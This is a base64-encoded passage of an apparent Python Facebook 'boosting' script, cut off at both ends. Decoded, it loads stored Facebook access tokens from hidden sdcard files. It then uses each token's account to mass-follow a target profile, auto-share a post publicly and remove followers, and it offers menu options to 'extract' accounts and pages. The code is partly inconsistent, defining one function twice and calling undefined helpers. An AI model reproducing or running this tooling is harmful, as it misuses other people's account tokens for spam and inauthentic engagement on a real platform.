aWQgPSBnZXRfcHJvZmlsZV9pZCh1c2VybmFtZSwgYWNjZXNzX3Rva2Vuc1swXSkKCiAgICBpZiBub3QgcHJvZmlsZV9pZDoKICAgICAgICBwcmludCgiRXJyb3I6IENvdWxkIG5vdCByZXRyaWV2ZSBwcm9maWxlIElELiBDaGVjayB0aGUgcHJvZmlsZSBsaW5rLiIpCiAgICAgICAgcmV0dXJuCgogICAgdHJ5OgogICAgICAgIG51bV90b19yZW1vdmUgPSBpbnQoaW5wdXQoJ0hPVyBNQU5ZIEZPTExPV0VSUyBETyBZT1UgV0FOVCBUTyBSRU1PVkU/ICcpKQogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoIkludmFsaWQgaW5wdXQuIFBsZWFzZSBlbnRlciBhIG51bWJlci4iKQogICAgICAgIHJldHVybgoKICAgIGRlZiByZW1vdmVfZm9sbG93ZXIoZm9sbG93ZXJfaWQsIGFjY2Vzc190b2tlbik6CiAgICAgICAgIiIiIFJlbW92ZXMgYSBzcGVjaWZpYyBmb2xsb3dlci4gIiIiCiAgICAgICAgdHJ5OgogICAgICAgICAgICB1cmwgPSBmImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxOS4wL3tmb2xsb3dlcl9pZH0iCiAgICAgICAgICAgIHBhcmFtcyA9IHsnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VufQogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmRlbGV0ZSh1cmwsIHBhcmFtcz1wYXJhbXMpCiAgICAgICAgICAgIHJldHVybiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDAKICAgICAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5SZXF1ZXN0RXhjZXB0aW9uOgogICAgICAgICAgICByZXR1cm4gRmFsc2UKCiAgICBkZWYgaGFuZGxlX3JlbW92aW5nKGFjY2Vzc190b2tlbik6CiAgICAgICAgIiIiIEhhbmRsZXMgdGhlIHJlbW92YWwgb2YgZm9sbG93ZXJzIHVzaW5nIGEgdG9rZW4uICIiIgogICAgICAgIG5vbmxvY2FsIHJlbW92ZV9jb3VudAogICAgICAgIGlmIHJlbW92ZV9jb3VudCA+PSBudW1fdG9fcmVtb3ZlOgogICAgICAgICAgICByZXR1cm4KICAgICAgICAKICAgICAgICBwcm9maWxlX25hbWUgPSBnZXRfcHJvZmlsZV91c2VybmFtZShwcm9maWxlX2lkLCBhY2Nlc3NfdG9rZW4pCiAgICAgICAgCiAgICAgICAgZm9sbG93ZXJzX3VybCA9IGYiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE5LjAve3Byb2ZpbGVfaWR9L3N1YnNjcmliZXJzIgogICAgICAgIHBhcmFtcyA9IHsnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VufQogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KGZvbGxvd2Vyc191cmwsIHBhcmFtcz1wYXJhbXMpCgogICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlICE9IDIwMDoKICAgICAgICAgICAgcHJpbnQoZiJFcnJvciBmZXRjaGluZyBmb2xsb3dlcnMgZm9yIHtwcm9maWxlX25hbWV9LiIpCiAgICAgICAgICAgIHJldHVybgoKICAgICAgICBkYXRhID0gcmVzcG9uc2UuanNvbigpCiAgICAgICAgZm9sbG93ZXJzID0gZGF0YS5nZXQoJ2RhdGEnLCBbXSkKCiAgICAgICAgZm9yIGZvbGxvd2VyIGluIGZvbGxvd2VyczoKICAgICAgICAgICAgaWYgcmVtb3ZlX2NvdW50ID49IG51bV90b19yZW1vdmU6CiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBmb2xsb3dlcl9pZCA9IGZvbGxvd2VyLmdldCgnaWQnKQogICAgICAgICAgICBpZiBmb2xsb3dlcl9pZCBhbmQgcmVtb3ZlX2ZvbGxvd2VyKGZvbGxvd2VyX2lkLCBhY2Nlc3NfdG9rZW4pOgogICAgICAgICAgICAgICAgcHJpbnQoZiJTVUNDRVNTOiBSZW1vdmVkIGZvbGxvd2VyIHtmb2xsb3dlcl9pZH0gZnJvbSB7cHJvZmlsZV9uYW1lfS4iKQogICAgICAgICAgICAgICAgcmVtb3ZlX2NvdW50ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHByaW50KGYiRkFJTEVEOiBDb3VsZCBub3QgcmVtb3ZlIGZvbGxvd2VyIHtmb2xsb3dlcl9pZH0gZnJvbSB7cHJvZmlsZV9uYW1lfS4iKQoKICAgIHJlbW92ZV9jb3VudCA9IDAKCiAgICB3aXRoIGNvbmN1cnJlbnQuZnV0dXJlcy5UaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MSkgYXMgZXhlY3V0b3I6CiAgICAgICAgZnV0dXJlcyA9IFtleGVjdXRvci5zdWJtaXQoaGFuZGxlX3JlbW92aW5nLCB0b2tlbikgZm9yIHRva2VuIGluIGFjY2Vzc190b2tlbnMgaWYgcmVtb3ZlX2NvdW50IDwgbnVtX3RvX3JlbW92ZV0KICAgICAgICBjb25jdXJyZW50LmZ1dHVyZXMud2FpdChmdXR1cmVzKQoKICAgIHByaW50KGYiU1VDQ0VTU0ZVTExZIFJFTU9WRUQge3JlbW92ZV9jb3VudH0gZm9sbG93ZXJzIG91dCBvZiB7bnVtX3RvX3JlbW92ZX0gcmVxdWVzdGVkLiIpCgpkZWYgZm9sbG93KCk6CiAgICBjbGVhcigpCiAgICBsb2dvKCkKICAgIHByaW50KCJbMV0gRk9MTE9XIEEgRkFDRUJPT0sgUFJPRklMRS9QQUdFIikKICAgIHByaW50KCJbMl0gUkVNT1ZFIEZPTExPV0VSUyBGUk9NIEEgRkFDRUJPT0sgUFJPRklMRS9QQUdFIikKICAgIHByaW50KCJbM10gRVhJVCIpCiAgICAKICAgIGNob2ljZSA9IGlucHV0KCdDSE9PU0U6ICcpLnN0cmlwKCkKICAgIAogICAgaWYgY2hvaWNlID09ICcxJzoKICAgICAgICBmb2xsb3dfZmFjZWJvb2soKSAgIyBUaGlzIGZ1bmN0aW9uIHNob3VsZCBiZSBkZWZpbmVkCiAgICBlbGlmIGNob2ljZSA9PSAnMic6CiAgICAgICAgcmVtb3ZlX2ZhY2Vib29rX2ZvbGxvd2VyKCkKICAgIGVsaWYgY2hvaWNlID09ICczJzoKICAgICAgICBleGl0KCkKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoIklOVkFMSUQgT1BUSU9OLiIpCiAgICAgICAgZm9sbG93KCkKZGVmIHVwZGF0ZSgpOgogICAgY2xlYXIoKQogICAgbG9nbygpCiAgICBtYWluX3JlcG9fcGF0aCA9ICcuJwogICAgYm9vc3RpbmdfcmVwb19wYXRoID0gJy4vQk9PU1RJTkcnCiAgICB0cnk6CiAgICAgICAgcHJpbnQoZiJ7Z3JlZW59VVBEQVRJTkcgVEhFIE1BSU4gUkVQT1NJVE9SWS4uLiIpCiAgICAgICAgc3VicHJvY2Vzcy5ydW4oWydnaXQnLCAncHVsbCddLCBjd2Q9bWFpbl9yZXBvX3BhdGgsIGNoZWNrPVRydWUpCiAgICAgICAgcHJpbnQoZiJ7d2hpdGV9TUFJTiBSRVBPU0lUT1JZIFVQREFURUQgU1VDQ0VTU0ZVTExZLiIpCiAgICBleGNlcHQgc3VicHJvY2Vzcy5DYWxsZWRQcm9jZXNzRXJyb3IgYXMgZToKICAgICAgICBwcmludChmIntyZWR9RVJST1IgT0NDVVJSRUQgV0hJTEUgVVBEQVRJTkcgVEhFIE1BSU4gUkVQT1NJVE9SWToge2V9IikKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhib29zdGluZ19yZXBvX3BhdGgpOgogICAgICAgIHByaW50KGYie3JlZH1CT09TVElORyBSRVBPU0lUT1JZIE5PVCBGT1VORCBMT0NBTExZLiBQTEVBU0UgQ0xPTkUgSVQgRklSU1QuIikKICAgICAgICByZXR1cm4KICAgIHRyeToKICAgICAgICBwcmludChmIntncmVlbn1QVUxMSU5HIFRIRSBMQVRFU1QgQ0hBTkdFUyBGUk9NIFRIRSBCT09TVElORyBSRVBPU0lUT1JZLi4uIikKICAgICAgICBzdWJwcm9jZXNzLnJ1bihbJ2dpdCcsICdwdWxsJ10sIGN3ZD1ib29zdGluZ19yZXBvX3BhdGgsIGNoZWNrPVRydWUpCiAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Qk9PU1RJTkcgUkVQT1NJVE9SWSBVUERBVEVEIFNVQ0NFU1NGVUxMWS4iKQogICAgZXhjZXB0IHN1YnByb2Nlc3MuQ2FsbGVkUHJvY2Vzc0Vycm9yIGFzIGU6CiAgICAgICAgcHJpbnQoZiJ7cmVkfUVSUk9SIE9DQ1VSUkVEIFdISUxFIFVQREFUSU5HIFRIRSBCT09TVElORyBSRVBPU0lUT1JZOiB7ZX0iKQogICAgICAgCmRlZiBmb2xsb3coKToKICAgIGNsZWFyKCkKICAgIGxvZ28oKQogICAgcHJpbnQoZicnJ3t3aGl0ZX0gIENIT09TRSBGQUNFQk9PSyBUTyBGT0xMT1c6JycnKQogICAgcHJpbnQoZicnJ3t5ZWxsb3d9ICBbMV0ge2JsdWV9WU9VUiBGUkEgTElTVCcnJykKICAgIHByaW50KGYnJyd7eWVsbG93fSAgWzJdIHtibHVlfVlPVVIgUlBBIExJU1QnJycpCiAgICBwcmludChmJycne3llbGxvd30gIFszXSB7Ymx1ZX1ZT1VSIEZSQSBQQUdFUyBMSVNUJycnKQogICAgcHJpbnQoZicnJ3t5ZWxsb3d9ICBbNF0ge2JsdWV9WU9VUiBSUEEgUEFHRVMgTElTVCcnJykKICAgIHByaW50KGYnJyd7cmVkfSAgWzBdIHtyZWR9UkVUVVJOIFRPIE1BSU4gTUVOVScnJykKICAgIGxpbmUoKQogICAgYWNjb3VudF9jaG9vc2UgPSBpbnB1dChmJycne3llbGxvd30gIENob29zZSA6IHtncmVlbn0nJycpCiAgICBsaW5lKCkKICAgIGlmIGFjY291bnRfY2hvb3NlID09ICcxJyBvciBhY2NvdW50X2Nob29zZSA9PSAnMDEnOgogICAgICAgIGZpbGVfcGF0aCA9ICcvc2RjYXJkLy5FWFRSQUNULVRPS0VOLUZSQS1BQ0NPVU5ULnR4dCcKICAgIGVsaWYgYWNjb3VudF9jaG9vc2UgPT0gJzInIG9yIGFjY291bnRfY2hvb3NlID09ICcwMic6CiAgICAgICAgZmlsZV9wYXRoID0gJy9zZGNhcmQvLkVYVFJBQ1QtVE9LRU4tUlAtQUNDT1VOVC50eHQnCiAgICBlbGlmIGFjY291bnRfY2hvb3NlID09ICczJyBvciBhY2NvdW50X2Nob29zZSA9PSAnMDMnOgogICAgICAgIGZpbGVfcGF0aCA9ICcvc2RjYXJkLy5FWFRSQUNULVRPS0VOLUZSQS1QQUdFUy50eHQnCiAgICBlbGlmIGFjY291bnRfY2hvb3NlID09ICc0JyBvciBhY2NvdW50X2Nob29zZSA9PSAnMDQnOgogICAgICAgIGZpbGVfcGF0aCA9ICcvc2RjYXJkLy5FWFRSQUNULVRPS0VOLVJQLVBBR0VTLnR4dCcKICAgIGVsaWYgYWNjb3VudF9jaG9vc2UgPT0gJzAnIG9yIGFjY291bnRfY2hvb3NlID09ICcwMCc6CiAgICAgICAgbWFpbigpCiAgICAgICAgcmV0dXJuCiAgICBhY2Nlc3NfdG9rZW5zID0gZ2V0X2FjY2Vzc190b2tlbl9mcm9tX2ZpbGUoZmlsZV9wYXRoKQogICAgaWYgbm90IGFjY2Vzc190b2tlbnM6CiAgICAgICAgcmV0dXJuIE5vbmUKICAgIHVzZXJfaWQgPSBpbnB1dChmJycne3llbGxvd30gIEVudGVyIHRhcmdldCBVSUQ6IHtncmVlbn0nJycpCiAgICBsaW5lKCkKICAgIHRyeToKICAgICAgICBsaW1pdCA9IGludChpbnB1dChmJycne3llbGxvd30gIElucHV0IHF1YW50aXR5IG9mIGZvbGxvd3MsIGxpbWl0IGlzIHtncmVlbn17bGVuKGFjY2Vzc190b2tlbnMpfSA6ICcnJykpCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludChmJycne3JlZH0gIEVycm9yOiBQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIgZm9yIHRoZSBsaW1pdC4nJycpCiAgICAgICAgcmV0dXJuIE5vbmUKICAgIGlmIGxpbWl0ID4gbGVuKGFjY2Vzc190b2tlbnMpOgogICAgICAgIHByaW50KGYnJyd7cmVkfSAgRXJyb3I6IFRoZSBzcGVjaWZpZWQgbGltaXQgZXhjZWVkcyB0aGUgbnVtYmVyIG9mIGF2YWlsYWJsZSBmb2xsb3dlcnMuJycnKQogICAgICAgIHJldHVybiBOb25lCiAgICBzdWNjZXNzX2NvdW50ID0gMAogICAgZmFpbHVyZV9jb3VudCA9IDAKICAgIGZvciBpLCBhY2Nlc3NfdG9rZW4gaW4gZW51bWVyYXRlKGFjY2Vzc190b2tlbnNbOmxpbWl0XSk6CiAgICAgICAgYXV0b19mb2xsb3dfdXJsID0gZicnJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxOS4wL3t1c2VyX2lkfS9zdWJzY3JpYmVycycnJwogICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAnQXV0aG9yaXphdGlvbic6IGYnJydCZWFyZXIge2FjY2Vzc190b2tlbn0nJycsCiAgICAgICAgICAgICd1c2VyLWFnZW50JzogV191ZXJhZ250KCkKICAgICAgICB9CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KGF1dG9fZm9sbG93X3VybCwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIGlmIHJlc3BvbnNlLm9rOgogICAgICAgICAgICBzdWNjZXNzX2NvdW50ICs9IDEKICAgICAgICAgICAgcHJpbnQoZicnJ3tncmVlbn0gIEZPTExPV0VSIHtpICsgMX0gLS0tPiBTdWNjZXNzZnVsbHkgRm9sbG93ZWQhJycnKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGZhaWx1cmVfY291bnQgKz0gMQogICAgICAgICAgICBwcmludChmJycne3JlZH0gIEZPTExPV0VSIHtpICsgMX0gLS0tPiBGYWlsZWQgdG8gRm9sbG93IScnJykKICAgIGxpbmUoKQogICAgcHJpbnQoZicnJ3t5ZWxsb3d9ICBUT1RBTCA6IFxuJycnKQogICAgcHJpbnQoZicnJ3tncmVlbn0gIENvbXBsZXRlZCA6IHt3aGl0ZX17c3VjY2Vzc19jb3VudH0nJycpCiAgICBwcmludChmJycne3JlZH0gIEZhaWxlZCA6IHt3aGl0ZX17ZmFpbHVyZV9jb3VudH0nJycpCiAgICAKaW1wb3J0IG9zCmltcG9ydCByYW5kb20KaW1wb3J0IHJlcXVlc3RzCmltcG9ydCB0aW1lCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IKCgpkZWYgZ2V0dG9rZXN6KGZpbGVfcGF0aCk6CiAgICAiIiJSZWFkIHRva2VucyBmcm9tIHRoZSBmaWxlIGFuZCByZXR1cm4gYSBsaXN0IG9mIHRva2Vucy4iIiIKICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyJykgYXMgZmlsZToKICAgICAgICBsaW5lcyA9IGZpbGUucmVhZGxpbmVzKCkKICAgICAgICByZXR1cm4gW2xpbmUuc3RyaXAoKS5zcGxpdCgnfCcpWzFdIGZvciBsaW5lIGluIGxpbmVzIGlmICd8JyBpbiBsaW5lXQoKCmNsYXNzIGZicG9zdDoKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBsaW5rKToKICAgICAgICBzZWxmLmxpbmsgPSBsaW5rCgogICAgZGVmIHNoaXIoc2VsZiwgdG9rZW4pOgogICAgICAgICIiIlNoYXJlcyBhIHBvc3Qgb24gdGhlIHVzZXIncyBmZWVkIHdpdGggJ09ubHkgTWUnIHByaXZhY3kuIiIiCiAgICAgICAgdXJsID0gImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZlZWQiCiAgICAgICAgcGF5bG9hZCA9IHsKICAgICAgICAgICAgJ2xpbmsnOiBzZWxmLmxpbmssCiAgICAgICAgICAgICdwdWJsaXNoZWQnOiAnMScsCiAgICAgICAgICAgICdwcml2YWN5JzogJ3sidmFsdWUiOiJFVkVSWU9ORSJ9JywKICAgICAgICAgICAgJ2FjY2Vzc190b2tlbic6IHRva2VuCiAgICAgICAgfQoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9cGF5bG9hZCkKICAgICAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgcHJpbnQoIlN1Y2Nlc3NmdWxseSBTaGFyZWQiKQogICAgICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLlJlcXVlc3RFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoZiJBbiBlcnJvciBvY2N1cnJlZDoge2V9IikKICAgICAgICAgICAgcmV0dXJuIEZhbHNlCgoKZGVmIHNndHoobGluaywgZmlsZV9wYXRoLCBudW1fc2hhcmVzKToKICAgIHN0YXJ0X2FsbCA9IHRpbWUudGltZSgpCgogICAgdG9rZW5zID0gZ2V0dG9rZXN6KGZpbGVfcGF0aCkKICAgIGlmIGxlbih0b2tlbnMpIDwgbnVtX3NoYXJlczoKICAgICAgICBwcmludCgiTm90IGVub3VnaCB0b2tlbnMgdG8gbWVldCB0aGUgcmVxdWVzdGVkIG51bWJlciBvZiBzaGFyZXMuIikKICAgICAgICByZXR1cm4KCiAgICBkZWYgd29ya2VyKHRva2VuKToKICAgICAgICBmYl9wb3N0ZXIgPSBmYnBvc3QobGluaykKICAgICAgICBmYl9wb3N0ZXIuc2hpcih0b2tlbikKCiAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0yMCkgYXMgZXhlY3V0b3I6CiAgICAgICAgZm9yIHRva2VuIGluIHRva2Vuc1s6bnVtX3NoYXJlc106CiAgICAgICAgICAgIGV4ZWN1dG9yLnN1Ym1pdCh3b3JrZXIsIHRva2VuKQoKICAgIGVuZF9hbGwgPSB0aW1lLnRpbWUoKQogICAgcHJpbnQoZiJcblNoYXJpbmcgc3RhcnRlZCBhdDoge3RpbWUuY3RpbWUoc3RhcnRfYWxsKX0iKQogICAgcHJpbnQoZiJTaGFyaW5nIGVuZGVkIGF0OiB7dGltZS5jdGltZShlbmRfYWxsKX0iKQogICAgcHJpbnQoZiJUb3RhbCBkdXJhdGlvbjoge2VuZF9hbGwgLSBzdGFydF9hbGw6LjJmfSBzZWNvbmRzIikKCgpkZWYgdHRzdSgqZmlsZV9wYXRocyk6CiAgICAiIiJDb3VudCB0aGUgbnVtYmVyIG9mIGxpbmVzIGluIGVhY2ggcHJvdmlkZWQgZmlsZS4iIiIKICAgIGNvdW50cyA9IFtdCiAgICBmb3IgZmlsZV9wYXRoIGluIGZpbGVfcGF0aHM6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICBjb3VudHMuYXBwZW5kKHN1bSgxIGZvciBsaW5lIGluIGZpbGUgaWYgbGluZS5zdHJpcCgpKSkKICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgICAgIGNvdW50cy5hcHBlbmQoMCkKICAgIHJldHVybiBjb3VudHMKCgpkZWYgdHRzKCk6CiAgICAiIiJFbnN1cmUgZGlyZWN0b3JpZXMgYW5kIGZpbGVzIGV4aXN0LiIiIgogICAgZmlsZV9wYXRocyA9IFsKICAgICAgICAnL3NkY2FyZC9ib29zdHBoZXJlL0ZSQUFDQ09VTlQudHh0JywKICAgICAgICAnL3NkY2FyZC9ib29zdHBoZXJlL0ZSQVBBR0VTLnR4dCcsCiAgICAgICAgJy9zZGNhcmQvYm9vc3RwaGVyZS9SUFdBQ0NPVU5ULnR4dCcsCiAgICAgICAgJy9zZGNhcmQvYm9vc3RwaGVyZS9SUFdQQUdFUy50eHQnLAogICAgXQoKICAgIGZvciBmaWxlX3BhdGggaW4gZmlsZV9wYXRoczoKICAgICAgICBkaXJlY3RvcnkgPSBvcy5wYXRoLmRpcm5hbWUoZmlsZV9wYXRoKQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhkaXJlY3RvcnkpOgogICAgICAgICAgICBvcy5tYWtlZGlycyhkaXJlY3RvcnkpCiAgICAgICAgICAgIHByaW50KGYiQ3JlYXRlZCBkaXJlY3Rvcnk6IHtkaXJlY3Rvcnl9IikKCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGZpbGVfcGF0aCk6CiAgICAgICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICd3JykgYXMgZmlsZToKICAgICAgICAgICAgICAgIHBhc3MgICMgQ3JlYXRlIGFuIGVtcHR5IGZpbGUKICAgICAgICAgICAgcHJpbnQoZiJDcmVhdGVkIGZpbGU6IHtmaWxlX3BhdGh9IikKCgpkZWYgcHVibGljKCk6CiAgICBwcmludCgiQ0hPT1NFIFRZUEUgT0YgQUNDT1VOVFMgVE8gQVVUTyBTSEFSRToiKQogICAgcHJpbnQoIlsxXSBGUkEgQUNDT1VOVCIpCiAgICBwcmludCgiWzJdIEZSQSBQQUdFUyIpCiAgICBwcmludCgiWzNdIFJQVyBBQ0NPVU5UIikKICAgIHByaW50KCJbNF0gUlBXIFBBR0VTIikKICAgIHByaW50KCJbMF0gRVhJVCIpCiAgICBjaG9pY2UgPSBpbnB1dCgiQ2hvaWNlOiAiKQoKICAgIGZpbGVfbWFwID0gewogICAgICAgICcxJzogJy9zZGNhcmQvYm9vc3RwaGVyZS9GUkFBQ0NPVU5ULnR4dCcsCiAgICAgICAgJzInOiAnL3NkY2FyZC9ib29zdHBoZXJlL0ZSQVBBR0VTLnR4dCcsCiAgICAgICAgJzMnOiAnL3NkY2FyZC9ib29zdHBoZXJlL1JQV0FDQ09VTlQudHh0JywKICAgICAgICAnNCc6ICcvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXUEFHRVMudHh0JwogICAgfQoKICAgIGZpbGVfcGF0aCA9IGZpbGVfbWFwLmdldChjaG9pY2UpCiAgICBpZiBub3QgZmlsZV9wYXRoOgogICAgICAgIHByaW50KCJJbnZhbGlkIGNob2ljZS4gRXhpdGluZy4iKQogICAgICAgIHJldHVybgoKICAgIGEgPSBpbnB1dCgiRW50ZXIgdGhlIHBvc3QgSUQgdG8gc2hhcmU6ICIpCiAgICBwb3N0X2lkID0gZ2V0X2NvbWJpbmVkX2RhdGEoYSkKICAgIG51bV9zaGFyZXMgPSBpbnQoaW5wdXQoIkxpbWl0OiAiKSkKICAgIGxpbmsgPSBmImh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS97cG9zdF9pZH0iCgogICAgc2d0eihsaW5rLCBmaWxlX3BhdGgsIG51bV9zaGFyZXMpCgoKZGVmIHB1YigpOgogICAgdHRzKCkKICAgIGZyYV9maWxlID0gJy9zZGNhcmQvYm9vc3RwaGVyZS9GUkFBQ0NPVU5ULnR4dCcKICAgIGZyYV9wYWdlc19maWxlID0gJy9zZGNhcmQvYm9vc3RwaGVyZS9GUkFQQUdFUy50eHQnCiAgICBycHdfZmlsZSA9ICcvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXQUNDT1VOVC50eHQnCiAgICBycHdfcGFnZXNfZmlsZSA9ICcvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXUEFHRVMudHh0JwoKICAgIHRvdGFsX2FjY291bnRzLCB0b3RhbF9wYWdlcywgcnB3X2FjY291bnRzLCBycHdfcGFnZXMgPSB0dHN1KAogICAgICAgIGZyYV9maWxlLCBmcmFfcGFnZXNfZmlsZSwgcnB3X2ZpbGUsIHJwd19wYWdlc19maWxlCiAgICApCiAgICBqb3ZhbigpCiAgICBwcmludChmIiIiICAgICAgICAgICAgICAgICB7aG90cGlua30gQUNDT1VOVCBPVkVSVklFV1Mge0d9IFsgQUNDT1VOVCAvIFBBR0UgXQogICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7eWVsbG93fUZSQSBBQ0NPVU5Ue3llbGxvd30gOiB7Z3JlZW59e3RvdGFsX2FjY291bnRzfQogICAgICAgICAgICAgICAgICAgICAgICAgICAge3llbGxvd31GUkEgUEFHRVMgIHt5ZWxsb3d9IDoge2dyZWVufXt0b3RhbF9wYWdlc30KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHt5ZWxsb3d9UlBXIEFDQ09VTlR7eWVsbG93fSA6IHtncmVlbn17IHJwd19hY2NvdW50c30KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHt5ZWxsb3d9UlBXIFBBR0VTICB7eWVsbG93fSA6IHtncmVlbn17cnB3X3BhZ2VzfQogICAgICB7eWVsbG93feKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG1bMG0iIiIpCiAgICBwcmludChmIiAgICAge2JsdWV9WzFdIHt5ZWxsb3d9RVhUUkFDVCBBQ0NPVU5UIikKICAgIHByaW50KGYiICAgICB7Ymx1ZX1bMl0ge3llbGxvd31BVVRPIFNIQVJFICIpCiAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIGNob2ljZSA9IGlucHV0KGYnICAgIHt5ZWxsb3d9RW50ZXIgQ2hvaWNlOiAnKQoKICAgIGlmIGNob2ljZSA9PSAnMic6CiAgICAgICAgcHVibGljKCkKCgoKCgoKIyBGdW5jdGlvbiB0byBjbGVhciBjb25zb2xlCmRlZiBjbGVhcigpOgogICAgb3Muc3lzdGVtKCdjbHMnIGlmIG9zLm5hbWUgPT0gJ250JyBlbHNlICdjbGVhcicpCgoKCgpkZWYgZXh0cmFjdGlvbigpOgoKICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICBwcmludChmIiAgICAge3doaXRlfVsxXSB7eWVsbG93fUVYVFJBQ1Qge3JlZH1BQ0NPVU5UIikKICAgIHByaW50KGYiICAgICB7d2hpdGV9WzJdIHt5ZWxsb3d9RVhUUkFDVCB7cmVkfVBBR0VTIikKICAgIHByaW50KCIgICAgIFwwMzNbMTszNG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIGNob2ljZSA9IGlucHV0KGYiICAgICB7Z3JlZW59Q0hPSUNFOiAiKS5zdHJpcCgpIAogICAgaWYgY2hvaWNlID09ICcxJzoKICAgICAgICBheGwxKCkKICAgIGVsaWYgY2hvaWNlID09ICcyJzoKICAgICAgICBheGwyKCkKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoZiIgICAgIHtyZWR9SU5WQUxJRCBDSE9JQ0UiKQpkZWYgbWFpbigpOgogICAgb3BlbignL3NkY2FyZC9ib29zdHBoZXJlL0ZSQUFDQ09VTlQudHh0JywgJ2EnKS53cml0ZSgnJykKICAgIG9wZW4oJy9zZGNhcmQvYm9vc3RwaGVyZS9GUkFQQUdFUy50eHQnLCAnYScpLndyaXRlKCcnKQogICAgb3BlbignL3NkY2FyZC9ib29zdHBoZXJlL1JQV0FDQ09VTlQudHh0JywgJ2EnKS53cml0ZSgnJykKICAgIG9wZW4oJy9zZGNhcmQvYm9vc3RwaGVyZS9SUFdBQ0NPVU5ULnR4dCcsICdhJykud3JpdGUoJycpCiAgICBmcmFhY2NvdW50c19maWxlID0gJy9zZGNhcmQvYm9vc3RwaGVyZS9GUkFBQ0NPVU5ULnR4dCcKICAgIGZyYXBhZ2VzX2ZpbGUgPSAnL3NkY2FyZC9ib29zdHBoZXJlL0ZSQVBBR0VTLnR4dCcKICAgIHJwd2FjY291bnRzID0gJy9zZGNhcmQvYm9vc3RwaGVyZS9SUFdBQ0NPVU5ULnR4dCcKICAgIHJwd3BhZ2VzID0gJy9zZGNhcmQvYm9vc3RwaGVyZS9SUFdQQUdFUy50eHQnCiAgICB0b3RhbF9hY2NvdW50cywgdG90YWxfcGFnZXMgPSBjb3VudF90b2tlbnMoZnJhYWNjb3VudHNf